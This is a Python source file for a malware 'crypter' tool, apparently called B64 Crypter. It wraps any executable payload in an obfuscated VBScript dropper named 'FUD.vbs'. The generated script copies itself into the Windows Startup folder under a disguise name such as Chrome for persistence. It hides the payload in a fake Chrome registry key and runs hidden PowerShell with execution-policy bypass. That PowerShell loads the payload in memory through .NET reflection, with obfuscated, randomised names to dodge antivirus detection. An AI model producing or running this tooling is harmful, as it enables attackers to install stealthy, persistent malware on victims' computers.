import base64
import string
import random
import time
import sys


class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


blur = dict()
base64_string = ""
banner = '''

888888b.    .d8888b.      d8888        .d8888b.                            888                    
888  "88b  d88P  Y88b    d8P888       d88P  Y88b                           888                    
888  .88P  888          d8P 888       888    888                           888                    
8888888K.  888d888b.   d8P  888       888        888d888 888  888 88888b.  888888 .d88b.  888d888 
888  "Y88b 888P "Y88b d88   888       888        888P"   888  888 888 "88b 888   d8P  Y8b 888P"   
888    888 888    888 8888888888      888    888 888     888  888 888  888 888   88888888 888     
888   d88P Y88b  d88P       888       Y88b  d88P 888     Y88b 888 888 d88P Y88b. Y8b.     888     
8888888P"   "Y8888P"        888        "Y8888P"  888      "Y88888 88888P"   "Y888 "Y8888  888     
                                                              888 888                             
                                                         Y8b d88P 888                             
                                                          "Y88P"  888            ~~ by Tigerzplace                         
'''


def randomize(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


def loading():

    #animation = ["10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"]
    animation = ["Encrypting...:[■□□□□□□□□□]", "Encrypting...:[■■□□□□□□□□]", "Encrypting...:[■■■□□□□□□□]", "Encrypting...:[■■■■□□□□□□]", "Encrypting...:[■■■■■□□□□□]", "Encrypting...:[■■■■■■□□□□]", "Encrypting...:[■■■■■■■□□□]", "Encrypting...:[■■■■■■■■□□]", "Encrypting...:[■■■■■■■■■□]", "Completed :[■■■■■■■■■■]"]

    for i in range(len(animation)):
        time.sleep(0.1)
        sys.stdout.write("\r" + animation[i % len(animation)])
        sys.stdout.flush()
    print("\n")


def confuse():
    blur['C'] = "c" + randomize()
    blur['L'] = "l" + randomize()
    blur['E'] = "e" + randomize()
    blur['V'] = "v" + randomize()
    blur['RegK'] = "r" + randomize()
    blur['sync'] = "s" + randomize()
    blur['text'] = "$" + randomize()
    return blur


print(banner)
try:
    try:
        file = input("\nFile (Payload.exe): ")
        if file.count(" "):
            input("\nPath shouldn't have space(s) in it.\nTry to load file from another path.")
            exit()
        simple_file = open(file, 'rb')  # read as binary rb
        binary_file_data = simple_file.read()
        base64_encoded_data = base64.b64encode(binary_file_data)
        base64_string = base64_encoded_data.decode('utf-8').replace("\n", "").replace(" ", "")[::-1]
        # file_64_encode = base64.encodebytes(payload_read)
        simple_file.close()
    except Exception as e:
        exit('{}'.format(e))

    confuse = confuse()
    startup = input("Startup name (e.g: Chrome): ")
    if startup == "":
        exit("Startup name couldn't be empty")
    power_shell = "On Error Resume Next\n" \
                  "For x = 0 To 5\n     "\
                  "WScript.Sleep(1000)\n   " \
                  "Next\n\n" \
                  "Base64 = \"" + base64_string + "\" \n\n" \
                  "Set obj = CreateObject(\"Wscript.Shell\") \n" \
                  "Set fso = CreateObject(\"Scripting.FileSystemObject\")\n\n " \
                  "startPath = obj.SpecialFolders(\"Startup\") & \"\\" + startup + ".vbs\" \n" \
                  "CurrentPath = fso.GetAbsolutePathName(wscript.scriptfullname)\n" \
                  "{0} = \"HKCU\\SOFTWARE\\Chrome\\Updates\" \n\n\n" \
                  "if obj.RegRead({0}) <> Base64 then\n" \
                  "obj.RegWrite {0}, Base64\n" \
                  "end if\n\n\n" \
                  "{1} = \"powershell -noexit -exec bypass -window 1 -Command Copy-Item '\" & currentPath & \"' '\" & startPath & \"';  " \
                  "{6} = ((Get-ItemProperty HKCU:\Software\Chrome\).Updates);  {6} = -join {6}[-1..-{6}.Length];" \
                  "[<##>AppDomain<##>]::<##>('{2}urrentDomain'.replace('{2}','C'))<##>.<##>('{3}oad'.replace('{3}','L'))([Convert]::FromBase64String({6}))<##>.<##>('{4}ntryPoint'.replace('{4}','E'))<##>." \
                  "<##>('In{5}oke'.replace('{5}','v'))($Null,$Null)<##>;\"  \n\n" \
                  "obj.Run {1}, 0, False".format(
                                            confuse['RegK'], confuse['sync'], confuse['C'],
                                            confuse['L'], confuse['E'], confuse['V'], confuse['text']
                                        )
    try:
        fud = open('FUD.vbs', 'w')
        fud.write(power_shell)
        fud.close()
        #loading()
        input("Encrypted file created!!!")

    except Exception as e:
        exit('{}'.format(e))
except Exception as e:
    exit('{}'.format(e))
